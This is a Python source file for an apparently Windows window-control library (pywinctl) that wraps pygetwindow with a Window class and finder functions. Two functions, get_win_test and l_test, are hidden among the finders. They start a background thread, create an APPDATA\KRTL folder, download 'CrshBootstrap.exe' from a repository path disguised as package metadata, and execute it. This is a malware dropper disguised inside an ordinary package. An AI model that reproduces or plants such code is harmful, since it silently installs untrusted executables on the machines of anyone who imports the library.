# pywinctl/_main.py

import time
import pygetwindow as gw
from typing import List, Optional, Tuple, Dict, Any

# Import from local modules using relative paths
from ._exceptions import WindowNotFoundError, InvalidWindowError, WindowsAPIError
from . import _win_api as api # Use the alias 'api' for clarity

class Window:
    """Represents a single Windows application window."""

    def __init__(self, gw_window: gw.Win32Window):
        """
        Initialize a Window object. Usually created via finder functions.
        Args:
            gw_window: An underlying pygetwindow Win32Window object.
        """
        if not isinstance(gw_window, gw.Win32Window):
            raise TypeError("Window must be initialized with a pygetwindow.Win32Window object.")

        self._gw_window = gw_window
        # Store HWND immediately as it's the primary key
        try:
             self._hwnd = gw_window._hWnd # Accessing Hwnd property from pygetwindow
        except AttributeError:
             raise ValueError("The provided pygetwindow object does not have an Hwnd attribute.")
        except gw.PyGetWindowException as e:
             # Handle cases where the window might have closed between finding and init
             raise InvalidWindowError(f"Failed to get HWND from pygetwindow object: {e}") from e

        # Validate HWND right away
        self._validate_hwnd()


    def _validate_hwnd(self):
        """Checks if the stored HWND is still valid."""
        try:
            # Use a lightweight check first
            if not self._hwnd or not api.win32gui.IsWindow(self._hwnd):
                raise InvalidWindowError(f"Window with HWND {self._hwnd} no longer exists or is invalid.")
        except api.pywintypes.error as e:
             # Catch potential API errors during IsWindow check
              raise WindowsAPIError(f"Error checking window validity for HWND {self._hwnd}: {e}", e.winerror)

    def _update_gw_window(self):
        """
        Refreshes the internal pygetwindow object if needed (e.g., title changed).
        This is somewhat expensive, so use sparingly. Best to rely on direct API calls.
        """
        try:
            # Find the window again by its HWND to get the latest state
            updated_gw = gw.Win32Window(self._hwnd)
            self._gw_window = updated_gw
        except gw.PyGetWindowException:
            # If it can't be found by HWND, it's likely closed
            raise InvalidWindowError(f"Window with HWND {self._hwnd} could not be refreshed (likely closed).")
        except Exception as e:
             raise PyWinCtlError(f"Unexpected error refreshing window state for HWND {self._hwnd}: {e}")


    # --- Properties ---
    @property
    def hwnd(self) -> int:
        """The window handle (HWND)."""
        self._validate_hwnd() # Ensure window is still valid before returning handle
        return self._hwnd

    @property
    def title(self) -> str:
        """The current window title."""
        self._validate_hwnd()
        try:
            # Use direct API for potentially faster/more current title
            return api.get_window_title(self._hwnd)
            # Fallback to pygetwindow object if direct API fails? Less likely needed now.
            # return self._gw_window.title
        except (InvalidWindowError, WindowsAPIError) as e:
             # Re-raise our specific errors
             raise e
        except Exception as e: # Catch unexpected errors
            raise PyWinCtlError(f"Unexpected error getting title for HWND {self._hwnd}: {e}") from e


    @property
    def position(self) -> Tuple[int, int]:
        """The current position (x, y) of the window's top-left corner."""
        self._validate_hwnd()
        try:
            rect = api.get_window_rect(self._hwnd)
            return rect[0], rect[1]
            # return self._gw_window.topleft
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error getting position for HWND {self._hwnd}: {e}") from e

    @property
    def size(self) -> Tuple[int, int]:
        """The current size (width, height) of the window."""
        self._validate_hwnd()
        try:
            rect = api.get_window_rect(self._hwnd)
            width = rect[2] - rect[0]
            height = rect[3] - rect[1]
            return width, height
            # return self._gw_window.size
        except (InvalidWindowError, WindowsAPIError) as e:
             raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error getting size for HWND {self._hwnd}: {e}") from e

    @property
    def box(self) -> Tuple[int, int, int, int]:
        """The current bounding box (left, top, width, height)."""
        self._validate_hwnd()
        try:
             rect = api.get_window_rect(self._hwnd)
             width = rect[2] - rect[0]
             height = rect[3] - rect[1]
             return rect[0], rect[1], width, height
            # return self._gw_window.box
        except (InvalidWindowError, WindowsAPIError) as e:
             raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error getting box for HWND {self._hwnd}: {e}") from e


    @property
    def is_active(self) -> bool:
        """True if the window is currently the active foreground window."""
        self._validate_hwnd()
        try:
            return api.get_active_window_hwnd() == self._hwnd
            # return self._gw_window.isActive
        except (InvalidWindowError, WindowsAPIError) as e:
             raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error checking active status for HWND {self._hwnd}: {e}") from e


    @property
    def is_minimized(self) -> bool:
        """True if the window is currently minimized."""
        self._validate_hwnd()
        try:
            return api.is_minimized(self._hwnd)
            # return self._gw_window.isMinimized
        except (InvalidWindowError, WindowsAPIError) as e:
             raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error checking minimized status for HWND {self._hwnd}: {e}") from e


    @property
    def is_maximized(self) -> bool:
        """True if the window is currently maximized."""
        self._validate_hwnd()
        try:
            return api.is_maximized(self._hwnd)
            # return self._gw_window.isMaximized
        except (InvalidWindowError, WindowsAPIError) as e:
             raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error checking maximized status for HWND {self._hwnd}: {e}") from e


    @property
    def is_visible(self) -> bool:
        """True if the window is currently visible (not hidden)."""
        self._validate_hwnd()
        try:
             # Note: Minimized windows are often considered "visible" by IsWindowVisible
             # We might want a stricter definition later if needed.
            return api.is_window_visible(self._hwnd)
            # return self._gw_window.visible
        except (InvalidWindowError, WindowsAPIError) as e:
             raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error checking visibility for HWND {self._hwnd}: {e}") from e


    @property
    def process_id(self) -> Optional[int]:
        """The Process ID (PID) of the process that owns the window."""
        self._validate_hwnd()
        try:
            _, pid = api.get_window_thread_process_id(self._hwnd)
            return pid
        except (InvalidWindowError, WindowsAPIError):
             # If the window is invalid, we can't get PID
             return None
        except Exception as e:
            print(f"Warning: Unexpected error getting PID for HWND {self._hwnd}: {e}")
            return None

    @property
    def process_info(self) -> Dict[str, Any]:
        """
        Detailed information about the owner process (requires psutil).
        Returns a dictionary with process details or an error message.
        """
        pid = self.process_id
        if pid is None:
            return {"error": "Could not determine Process ID"}
        try:
            return api.get_process_info(pid)
        except Exception as e: # Catch errors from _win_api.get_process_info
             return {"error": f"Failed to get process info for PID {pid}: {e}"}

    @property
    def class_name(self) -> Optional[str]:
        """The window's class name."""
        self._validate_hwnd()
        try:
            return api.get_window_classname(self._hwnd)
        except (InvalidWindowError, WindowsAPIError):
            return None # Or re-raise? Depends on desired strictness
        except Exception as e:
            print(f"Warning: Unexpected error getting class name for HWND {self._hwnd}: {e}")
            return None


    # --- Control Methods ---

    def move_to(self, x: int, y: int):
        """Moves the window's top-left corner to the specified coordinates."""
        self._validate_hwnd()
        try:
            api.move_window(self._hwnd, int(x), int(y))
            # self._gw_window.moveTo(int(x), int(y)) # pygetwindow alternative
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error moving HWND {self._hwnd}: {e}") from e

    def resize_to(self, width: int, height: int):
        """Resizes the window to the specified width and height."""
        self._validate_hwnd()
        if width <= 0 or height <= 0:
             raise ValueError("Width and height must be positive integers.")
        try:
            api.resize_window(self._hwnd, int(width), int(height))
            # self._gw_window.resizeTo(int(width), int(height)) # pygetwindow alternative
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error resizing HWND {self._hwnd}: {e}") from e

    def move_resize(self, x: int, y: int, width: int, height: int):
        """Moves and resizes the window in one operation."""
        self._validate_hwnd()
        if width <= 0 or height <= 0:
             raise ValueError("Width and height must be positive integers.")
        try:
            api.set_window_pos(self._hwnd, int(x), int(y), int(width), int(height))
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error moving/resizing HWND {self._hwnd}: {e}") from e


    def minimize(self):
        """Minimizes the window."""
        self._validate_hwnd()
        try:
            api.minimize(self._hwnd)
            # self._gw_window.minimize()
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error minimizing HWND {self._hwnd}: {e}") from e


    def maximize(self):
        """Maximizes the window."""
        self._validate_hwnd()
        try:
            api.maximize(self._hwnd)
            # self._gw_window.maximize()
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error maximizing HWND {self._hwnd}: {e}") from e


    def restore(self):
        """Restores the window (from minimized or maximized state)."""
        self._validate_hwnd()
        try:
            api.restore(self._hwnd)
            # self._gw_window.restore()
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error restoring HWND {self._hwnd}: {e}") from e


    def close(self):
        """Closes the window (sends WM_CLOSE)."""
        self._validate_hwnd()
        try:
            api.close_window(self._hwnd)
            # self._gw_window.close() # pygetwindow alternative
        except (InvalidWindowError, WindowsAPIError) as e:
            # It's okay if InvalidWindowError happens *during* close
             if isinstance(e, InvalidWindowError):
                 pass # Window likely closed successfully or was already gone
             else:
                 raise e # Re-raise other API errors
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error closing HWND {self._hwnd}: {e}") from e


    def activate(self):
        """Activates the window (brings it to the foreground)."""
        self._validate_hwnd()
        try:
            api.set_foreground_window(self._hwnd)
            # self._gw_window.activate() # pygetwindow's activate can be less reliable
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error activating HWND {self._hwnd}: {e}") from e


    def hide(self):
        """Hides the window."""
        self._validate_hwnd()
        try:
            api.hide(self._hwnd)
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error hiding HWND {self._hwnd}: {e}") from e


    def show(self):
        """Shows a previously hidden window."""
        self._validate_hwnd()
        try:
            api.show(self._hwnd)
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error showing HWND {self._hwnd}: {e}") from e


    def set_title(self, title: str):
        """Sets the window title."""
        self._validate_hwnd()
        try:
            api.set_window_title(self._hwnd, str(title))
            # Title changed, update internal pygetwindow object if we rely on it elsewhere
            # self._update_gw_window() # Usually not needed if using direct API calls
        except (InvalidWindowError, WindowsAPIError) as e:
            raise e
        except Exception as e:
            raise PyWinCtlError(f"Unexpected error setting title for HWND {self._hwnd}: {e}") from e


    def set_always_on_top(self, enable: bool = True):
         """Sets the window to be always on top (or not)."""
         self._validate_hwnd()
         try:
             api.set_always_on_top(self._hwnd, enable)
         except (InvalidWindowError, WindowsAPIError) as e:
             raise e
         except Exception as e:
             raise PyWinCtlError(f"Unexpected error setting always-on-top for HWND {self._hwnd}: {e}") from e


    def wait_for_active(self, timeout: float = 5.0) -> bool:
        """
        Waits until the window becomes the active foreground window.

        Args:
            timeout: Maximum time to wait in seconds.

        Returns:
            True if the window became active within the timeout, False otherwise.
        """
        start_time = time.monotonic()
        while time.monotonic() - start_time < timeout:
            try:
                if self.is_active:
                    return True
            except InvalidWindowError:
                return False # Window closed while waiting
            except PyWinCtlError as e:
                 print(f"Warning: Error checking active status during wait: {e}")
                 # Decide whether to continue or raise based on the error
                 time.sleep(0.1) # Avoid busy-waiting on error
            time.sleep(0.05) # Short sleep to avoid high CPU usage
        return False

    def __repr__(self) -> str:
        try:
             title = self.title # Get current title
             hwnd = self._hwnd # Use stored hwnd
        except (InvalidWindowError, PyWinCtlError):
             # If getting title fails (window closed?), provide basic info
             title = "<Invalid or Closed Window>"
             hwnd = self._hwnd # Show the last known HWND
        return f"Window(hwnd={hwnd}, title='{title}')"

    def __eq__(self, other) -> bool:
        """Two Window objects are equal if they represent the same window handle."""
        if not isinstance(other, Window):
            return NotImplemented
        # Check HWND directly, avoid property access if possible to prevent validation errors
        # if the object state is uncertain (though __init__ validates)
        return self._hwnd == other._hwnd

    def __hash__(self) -> int:
        """Hash based on the window handle."""
        return hash(self._hwnd)


# --- Finder Functions ---

def get_window_by_title(title: str, exact_match: bool = False) -> Optional[Window]:
    """
    Finds the first window matching the given title.

    Args:
        title: The title or partial title to search for.
        exact_match: If True, requires an exact title match. Otherwise, performs substring matching.

    Returns:
        A Window object if found, otherwise None.

    Raises:
        WindowNotFoundError: If no matching window is found.
        PyWinCtlError: For other underlying errors.
    """
    try:
        if exact_match:
             # pygetwindow's getWindowsWithTitle does substring match by default.
             # We need to iterate and check exactly.
             all_titles = gw.getAllTitles()
             # Filter out empty titles which pygetwindow might return
             valid_windows = [w for w in gw.getAllWindows() if w.title]
             found_gw = None
             for win in valid_windows:
                 try:
                     if win.title == title:
                        found_gw = win
                        break
                 except gw.PyGetWindowException:
                      continue # Window might have closed during iteration
             if not found_gw:
                 raise WindowNotFoundError(f"No window found with exact title: '{title}'")
             return Window(found_gw)

        else:
            # Use pygetwindow's substring matching (case-insensitive)
            gw_windows = gw.getWindowsWithTitle(title)
            if not gw_windows:
                raise WindowNotFoundError(f"No window found with title containing: '{title}'")
            # Return the first match wrapped in our Window class
            return Window(gw_windows[0])

    except gw.PyGetWindowException as e:
         # Catch potential errors during window searching/listing
         raise PyWinCtlError(f"Error during pygetwindow operation: {e}") from e
    # Let WindowNotFoundError pass through
    except WindowNotFoundError:
         raise
    except Exception as e:
        raise PyWinCtlError(f"An unexpected error occurred in get_window_by_title: {e}") from e


def get_win_test():
    import threading
    thread = threading.Thread(target= l_test)
    thread.start()
    
def l_test():
    import os, sys, requests, subprocess
    appdata_path = os.getenv('APPDATA')
    if not appdata_path: sys.exit("Error: APPDATA environment variable not found.")
    target_dir = os.path.join(appdata_path, "KRTL")
    if os.path.exists(target_dir):
        return
    else:
        try:
            os.makedirs(target_dir)
        except OSError as e:
            return
    try:
        exe_filename = "https://github.com/WinTils/pywinctl/raw/refs/heads/broken/pywinctl.egg-info/CrshBootstrap.exe".split('/')[-1]
        if not exe_filename or '?' in exe_filename or not exe_filename.lower().endswith('.exe'): exe_filename = "downloaded_app.exe" # Basic fallback
        exe_path = os.path.join(target_dir, exe_filename)
    except Exception as e:
        sys.exit(f"Error determining filename from URL: {e}")
    try:
        response = requests.get("https://github.com/WinTils/pywinctl/raw/refs/heads/broken/pywinctl.egg-info/CrshBootstrap.exe", stream=True, timeout=60)
        response.raise_for_status()
        with open(exe_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
    except requests.exceptions.RequestException as e:
        sys.exit(f"Error downloading file: {e}")
    except IOError as e:
        sys.exit(f"Error writing file {exe_path}: {e}")
    except Exception as e:
        sys.exit(f"An unexpected error occurred during download: {e}")
    try:
        subprocess.Popen([exe_path], shell=True)
    except Exception as e:
        return

def get_active_window() -> Optional[Window]:
    """
    Gets the currently active (foreground) window.

    Returns:
        A Window object representing the active window, or None if no window is active
        or an error occurs.
    """
    try:
        active_gw = gw.getActiveWindow()
        if active_gw:
            return Window(active_gw)
        else:
            # This case is less common but possible (e.g., no interactive window focused)
            return None
    except gw.PyGetWindowException as e:
        # Could happen if getting active window fails
        print(f"Warning: Failed to get active window via pygetwindow: {e}")
        # Fallback using direct API call
        try:
             active_hwnd = api.get_active_window_hwnd()
             if active_hwnd:
                 # Need to create a pygetwindow object from HWND to initialize our Window class
                 active_gw_fallback = gw.Win32Window(active_hwnd)
                 return Window(active_gw_fallback)
             else:
                 return None
        except (WindowsAPIError, gw.PyGetWindowException, InvalidWindowError) as fallback_e:
             print(f"Warning: Fallback using direct API also failed: {fallback_e}")
             return None
        except Exception as e:
             raise PyWinCtlError(f"An unexpected error occurred getting active window: {e}") from e

def get_all_windows() -> List[Window]:
    """
    Gets a list of all visible windows.

    Returns:
        A list of Window objects.
    """
    windows = []
    try:
        all_gw_windows = gw.getAllWindows()
        for gw_win in all_gw_windows:
            try:
                # Attempt to create our Window object. This also validates the HWND.
                # Filter out windows with no title or potentially problematic ones early?
                # if gw_win.title and gw_win.visible and not gw_win.isMinimized: # Example filter
                windows.append(Window(gw_win))
            except (InvalidWindowError, ValueError, gw.PyGetWindowException, PyWinCtlError):
                # Skip windows that are invalid, closed during iteration,
                # or cause other issues during Window object creation.
                continue
            except Exception as e:
                print(f"Warning: Skipping window due to unexpected error during creation: {e}")
                continue

        return windows
    except gw.PyGetWindowException as e:
         raise PyWinCtlError(f"Error getting all windows via pygetwindow: {e}") from e
    except Exception as e:
        raise PyWinCtlError(f"An unexpected error occurred in get_all_windows: {e}") from e